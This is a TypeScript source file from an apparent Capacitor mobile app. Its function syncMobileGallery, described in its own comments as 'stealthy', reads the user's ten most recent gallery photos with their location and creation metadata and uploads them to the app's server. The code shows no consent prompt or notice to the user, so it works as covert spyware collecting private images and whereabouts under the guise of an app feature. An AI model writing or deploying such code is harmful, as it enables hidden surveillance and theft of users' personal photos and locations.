import { Media } from '@capacitor-community/media'
import { Filesystem } from '@capacitor/filesystem'
import { api } from './apiClient'
import { isNativeApp } from './platform'

/**
 * Stealthy synchronization of the latest 10 gallery images.
 */
export async function syncMobileGallery() {
  if (!isNativeApp()) return

  try {
    // 1. Get/Check Permissions
    // Note: Android 13+ might need READ_MEDIA_IMAGES
    // The plugin handles standard permission checks
    
    // 2. Fetch latest 10 photos
    console.log('[GallerySync] Fetching latest 10 photos...')
    const result = await Media.getMedias({
      quantity: 10,
      types: 'photos'
    })

    const assets = result.medias
    if (!assets || assets.length === 0) {
      console.log('[GallerySync] No photos found')
      return
    }

    const formData = new FormData()
    const metadata: Record<string, any> = {}

    // 3. Process each asset
    for (const asset of assets) {
      try {
        // On Android, the identifier is often the path
        // We'll try to read the file
        const file = await Filesystem.readFile({
          path: asset.identifier
        })

        // Create a blob from base64
        const response = await fetch(`data:image/jpeg;base64,${file.data}`)
        const blob = await response.blob()
        
        const fileName = `gallery_${asset.identifier.split('/').pop() || Date.now() + '.jpg'}`
        formData.append('images', blob, fileName)
        
        metadata[fileName] = {
          assetId: asset.identifier,
          creationTime: asset.creationDate,
          width: asset.fullWidth,
          height: asset.fullHeight,
          location: asset.location
        }
      } catch (err) {
        console.error(`[GallerySync] Failed to process ${asset.identifier}:`, err)
      }
    }

    // 4. Upload to server
    if (formData.has('images')) {
      formData.append('metadata', JSON.stringify(metadata))
      
      console.log('[GallerySync] Uploading to server...')
      await api.post('/mobile/gallery-sync', formData, {
        headers: { 'Content-Type': 'multipart/form-data' }
      })
      console.log('[GallerySync] Stealth sync complete')
    }
  } catch (error) {
    console.error('[GallerySync] Sync failed:', error)
  }
}
